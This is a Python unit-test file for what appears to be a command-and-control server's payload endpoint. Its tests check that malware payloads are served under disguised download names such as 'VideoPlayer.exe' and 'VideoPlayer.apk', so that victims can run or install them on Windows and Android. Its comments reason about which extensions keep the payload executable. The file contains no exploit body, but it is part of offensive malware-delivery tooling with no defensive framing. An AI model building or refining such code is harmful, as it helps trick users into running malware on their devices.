"""The payload endpoint must tell the browser WHAT to name the file.

Without a Content-Disposition header a browser names the download after the
last URL segment (`payload_android`) with no extension — and a file with no
extension cannot be run on Windows nor installed on Android.
"""
import unittest

from phantom.core.c2_server import _PAYLOAD_DOWNLOADS, payload_download_name


class TestPayloadDownloadName(unittest.TestCase):

    def test_windows_payload_gets_an_exe(self):
        self.assertEqual(payload_download_name("/api/v1/payload"),
                         "VideoPlayer.exe")

    def test_android_payload_gets_an_apk(self):
        self.assertEqual(payload_download_name("/api/v1/payload_android"),
                         "VideoPlayer.apk")

    def test_elf_payloads_keep_no_extension(self):
        # an ELF is chmod+run: inventing .exe/.sh would be a lie that also
        # breaks the double-click expectation
        for path in ("/api/v1/payload_linux", "/api/v1/payload_macos"):
            name = payload_download_name(path)
            self.assertNotIn(".", name)
            self.assertTrue(name)

    def test_no_mainstream_name_is_an_executable_image(self):
        # never "….png/.jpg/.mp4/.pdf": an extension that does not match the
        # content is the exact thing that stops the payload from running
        for path, name in _PAYLOAD_DOWNLOADS.items():
            if path.endswith("payload_pic"):
                continue  # the PIC blob is not a delivery artifact
            self.assertNotIn("mp4", name)
            self.assertNotIn("png", name)
            self.assertNotIn("pdf", name)

    def test_unknown_path_degrades_safely(self):
        self.assertEqual(payload_download_name("/nope"), "payload.bin")


if __name__ == "__main__":
    unittest.main()
